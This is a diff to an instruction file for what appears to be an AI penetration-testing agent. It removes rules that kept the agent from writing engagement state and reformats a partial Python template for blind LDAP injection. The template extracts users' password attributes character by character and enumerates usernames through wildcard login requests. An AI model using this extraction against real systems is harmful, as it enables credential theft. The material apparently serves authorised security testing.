@@ -37,10 +37,6 @@ When an engagement directory exists:
 - **Evidence** → save significant output to `engagement/evidence/` with
   descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).
 
-Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
-engagement state. The orchestrator maintains these files. Report all findings
-in your return summary.
-
 ## State Management
 
 Call `get_state_summary()` from the state-reader MCP server to read current
@@ -49,9 +45,7 @@ engagement state. Use it to:
 - Leverage existing credentials or access for this technique
 - Understand what's been tried and failed (check Blocked section)
 
-**Do NOT write engagement state.** When your work is complete, report all
-findings clearly in your return summary. The orchestrator parses your summary
-and records state changes. Your return summary must include:
+Your return summary must include:
 - New targets/hosts discovered (with ports and services)
 - New credentials or tokens found
 - Access gained or changed (user, privilege level, method)
@@ -292,15 +286,11 @@ CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#
 
 # What indicates a successful match
 SUCCESS_INDICATOR = "Welcome"  # or check status code, response size, redirect
-
-
 def check(payload_user, payload_pass):
     """Send login request, return True if match."""
     data = {USERNAME_FIELD: payload_user, PASSWORD_FIELD: payload_pass}
     r = requests.post(URL, data=data, allow_redirects=False)
     return SUCCESS_INDICATOR in r.text or r.status_code == 302
-
-
 def extract_attribute(target_user, attribute="userPassword"):
     """Extract attribute value character by character."""
     extracted = ""
@@ -317,8 +307,6 @@ def extract_attribute(target_user, attribute="userPassword"):
         if not found:
             break
     return extracted
-
-
 def enumerate_users(prefix=""):
     """Discover usernames via uid wildcard brute-force."""
     users = []
@@ -334,8 +322,6 @@ def enumerate_users(prefix=""):
     if not users and prefix:
         users.append(prefix)
     return users
-
-
 if __name__ == "__main__":
     print("[*] Enumerating users...")
     users = enumerate_users()
